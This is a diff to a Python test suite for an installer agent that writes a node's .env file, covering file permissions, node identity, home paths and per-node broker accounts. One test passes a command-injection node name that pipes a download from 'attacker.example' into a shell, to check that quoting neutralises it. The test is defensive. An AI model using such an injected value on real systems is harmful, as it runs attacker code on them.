@@ -11,6 +11,7 @@ keeps the value out of the *runner's* argv, but SSH exec runs
 by any local user with ``ps`` for as long as the launch takes.
 """
 
+import shlex
 from dataclasses import replace
 from typing import Any
 
@@ -19,6 +20,7 @@ import pytest
 from wactorz.agents import installer_agent
 from wactorz.agents.installer_agent import InstallerAgent
 from wactorz.config import CONFIG, DeployTarget
+from wactorz.core import broker_accounts, node_signing
 
 
 class FakeSftp:
@@ -64,7 +66,7 @@ class TestWhatIsWritten:
         sftp = FakeSftp()
         target = _target(broker_user="rpi-account", broker_password="per-node")
 
-        assert await _agent()._put_broker_env(sftp, target, "pi")
+        assert await _agent()._put_node_env(sftp, target, "/home/pi", "rpi", "10.0.0.1", 1883)
 
         body = sftp.written["/home/pi/wactorz/.env"]
         assert "MQTT_USERNAME=rpi-account" in body
@@ -75,7 +77,7 @@ class TestWhatIsWritten:
         _server_broker(monkeypatch, "wactorz", "shared")
         sftp = FakeSftp()
 
-        assert await _agent()._put_broker_env(sftp, _target(), "pi")
+        assert await _agent()._put_node_env(sftp, _target(), "/home/pi", "rpi", "10.0.0.1", 1883)
 
         assert "MQTT_PASSWORD=shared" in sftp.written["/home/pi/wactorz/.env"]
 
@@ -84,20 +86,60 @@ class TestWhatIsWritten:
         # this closes, but a 0644 secret is indefensible either way.
         sftp = FakeSftp()
 
-        await _agent()._put_broker_env(sftp, _target(broker_password="p"), "pi")
+        await _agent()._put_node_env(
+            sftp, _target(broker_password="p"), "/home/pi", "rpi", "10.0.0.1", 1883
+        )
 
         assert sftp.modes["/home/pi/wactorz/.env"] == 0o600
 
-    async def test_an_anonymous_broker_writes_nothing(
+    async def test_an_anonymous_broker_still_gets_a_file_but_no_credentials(
         self, monkeypatch: pytest.MonkeyPatch
     ) -> None:
-        # Otherwise a working anonymous setup gains a runner that exports two
-        # empty variables, which is a connection failure rather than a no-op.
+        # The file carries the node's identity too, and the systemd unit reads
+        # every argument from it, so it is always written. What must not appear
+        # is two empty variables: exporting those is a connection failure rather
+        # than a no-op, and reporting "credentials written" would be a lie.
         _server_broker(monkeypatch, "", "")
         sftp = FakeSftp()
 
-        assert not await _agent()._put_broker_env(sftp, _target(), "pi")
-        assert not sftp.written
+        assert not await _agent()._put_node_env(
+            sftp, _target(), "/home/pi", "rpi", "10.0.0.1", 1883
+        )
+
+        body = sftp.written["/home/pi/wactorz/.env"]
+        assert "MQTT_USERNAME" not in body
+        assert "MQTT_PASSWORD" not in body
+        assert "WACTORZ_NODE=rpi" in body
+
+    async def test_the_node_identity_is_written_for_the_unit(self) -> None:
+        # --port has no environment fallback in the runner's parser, unlike
+        # --broker and --name, so an unwritten WACTORZ_PORT expands to an empty
+        # argument under the unit and argparse exits 2.
+        sftp = FakeSftp()
+
+        await _agent()._put_node_env(sftp, _target(), "/home/pi", "rpi", "10.0.0.1", 8883)
+
+        body = sftp.written["/home/pi/wactorz/.env"]
+        assert "WACTORZ_NODE=rpi" in body
+        assert "WACTORZ_BROKER=10.0.0.1" in body
+        assert "WACTORZ_PORT=8883" in body
+
+    async def test_a_hostile_node_name_is_quoted_for_both_parsers(self) -> None:
+        # The file is sourced by a shell on the nohup path and read as an
+        # EnvironmentFile under a unit. shlex.quote is the safe intersection:
+        # systemd accepts single-quoted values and does no command substitution.
+        sftp = FakeSftp()
+
+        await _agent()._put_node_env(
+            sftp, _target(), "/home/pi", "node; curl attacker.example|sh", "10.0.0.1", 1883
+        )
+
+        line = next(
+            ln
+            for ln in sftp.written["/home/pi/wactorz/.env"].splitlines()
+            if ln.startswith("WACTORZ_NODE=")
+        )
+        assert shlex.split(line) == ["WACTORZ_NODE=node; curl attacker.example|sh"]
 
     @pytest.mark.parametrize(
         "hostile",
@@ -107,11 +149,11 @@ class TestWhatIsWritten:
         # The file is `. `-sourced by a shell, so an unquoted value would be
         # shell syntax on the node — the injection the launch line was fixed for,
         # moved into a file.
-        import shlex
-
         sftp = FakeSftp()
 
-        await _agent()._put_broker_env(sftp, _target(broker_password=hostile), "pi")
+        await _agent()._put_node_env(
+            sftp, _target(broker_password=hostile), "/home/pi", "rpi", "10.0.0.1", 1883
+        )
 
         line = next(
             ln
@@ -119,6 +161,117 @@ class TestWhatIsWritten:
             if ln.startswith("MQTT_PASSWORD=")
         )
         assert shlex.split(line) == [f"MQTT_PASSWORD={hostile}"]
+
+
+class TestWhereItIsWritten:
+    """The node says where its home is; nothing derives it from the user name.
+
+    Every shell step in the deploy addresses `~`, so a home that is not
+    `/home/<user>` -- root's `/root` above all -- would put the uploads and the
+    unit somewhere the venv is not. That is why deploying as root never worked.
+    """
+
+    async def test_it_follows_the_resolved_home(self) -> None:
+        sftp = FakeSftp()
+
+        await _agent()._put_node_env(
+            sftp, _target(broker_password="p"), "/root", "rpi", "10.0.0.1", 1883
+        )
+
+        assert "/root/wactorz/.env" in sftp.written
+        assert not any(path.startswith("/home/root") for path in sftp.written)
+
+    async def test_an_unusual_home_is_honoured_too(self) -> None:
+        # LDAP and /var/lib homes are the same shape of problem as root's.
+        sftp = FakeSftp()
+
+        await _agent()._put_node_env(
+            sftp, _target(broker_password="p"), "/var/lib/wactorz-node", "rpi", "10.0.0.1", 1883
+        )
+
+        assert "/var/lib/wactorz-node/wactorz/.env" in sftp.written
+
+
+class TestAnAccountOfItsOwn:
+    """`WACTORZ_NODE_ACCOUNTS`: the node authenticates as itself, not as the server.
+
+    Off by default, because the account has to exist on the broker: it is generated
+    for the brokers Wactorz configures, and on any other broker a node presenting a
+    name that broker has never heard of would simply be refused.
+    """
+
+    @pytest.fixture(autouse=True)
+    def _own_secret(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        # Passwords are derived from the install's signing secret; the suite's state
+        # directory is a fresh one per test, so the cached secret has to go with it.
+        monkeypatch.setattr(node_signing, "_secret", None)
+
+    def _accounts_on(self, monkeypatch: pytest.MonkeyPatch, **fields: Any) -> None:
+        monkeypatch.setattr(
+            installer_agent,
+            "CONFIG",
+            replace(CONFIG, node_accounts=True, **fields),
+        )
+
+    async def test_the_node_gets_the_account_derived_for_it(
+        self, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        self._accounts_on(monkeypatch, mqtt_username="wactorz", mqtt_password="the-server's")
+        sftp = FakeSftp()
+
+        assert await _agent()._put_node_env(sftp, _target(), "/home/pi", "rpi", "10.0.0.1", 1883)
+
+        body = sftp.written["/home/pi/wactorz/.env"]
+        assert "MQTT_USERNAME=rpi" in body
+        assert f"MQTT_PASSWORD={broker_accounts.password('rpi')}" in body
+        assert "the-server's" not in body
+
+    async def test_it_is_off_unless_asked_for(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        # An existing install deploys exactly as it did: the server's own account.
+        _server_broker(monkeypatch, "wactorz", "shared")
+        sftp = FakeSftp()
+
+        await _agent()._put_node_env(sftp, _target(), "/home/pi", "rpi", "10.0.0.1", 1883)
+
+        body = sftp.written["/home/pi/wactorz/.env"]
+        assert "MQTT_USERNAME=wactorz" in body
+        assert "MQTT_PASSWORD=shared" in body
+
+    async def test_an_account_set_for_the_target_still_wins(
+        self, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        self._accounts_on(monkeypatch)
+        sftp = FakeSftp()
+        target = _target(broker_user="rpi-account", broker_password="per-node")
+
+        await _agent()._put_node_env(sftp, target, "/home/pi", "rpi", "10.0.0.1", 1883)
+
+        body = sftp.written["/home/pi/wactorz/.env"]
+        assert "MQTT_USERNAME=rpi-account" in body
+        assert "MQTT_PASSWORD=per-node" in body
+
+    async def test_a_name_that_cannot_be_an_account_fails_the_deploy(
+        self, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        # Refused rather than deployed with credentials no broker has: that node
+        # would retry for ever with nothing saying why.
+        self._accounts_on(monkeypatch)
+
+        with pytest.raises(ValueError, match="broker account"):
+            await _agent()._put_node_env(
+                FakeSftp(), _target(), "/home/pi", "rpi:kitchen", "10.0.0.1", 1883
+            )
+
+    async def test_two_nodes_do_not_share_a_password(self, monkeypatch: pytest.MonkeyPatch) -> None:
+        self._accounts_on(monkeypatch)
+        sftp = FakeSftp()
+
+        await _agent()._put_node_env(sftp, _target(), "/home/pi", "rpi", "10.0.0.1", 1883)
+        await _agent()._put_node_env(sftp, _target(), "/home/other", "other", "10.0.0.1", 1883)
+
+        first = sftp.written["/home/pi/wactorz/.env"]
+        second = sftp.written["/home/other/wactorz/.env"]
+        assert first.split("MQTT_PASSWORD=")[1] != second.split("MQTT_PASSWORD=")[1]
 
 
 def _server_broker(monkeypatch: pytest.MonkeyPatch, user: str, password: str) -> None:
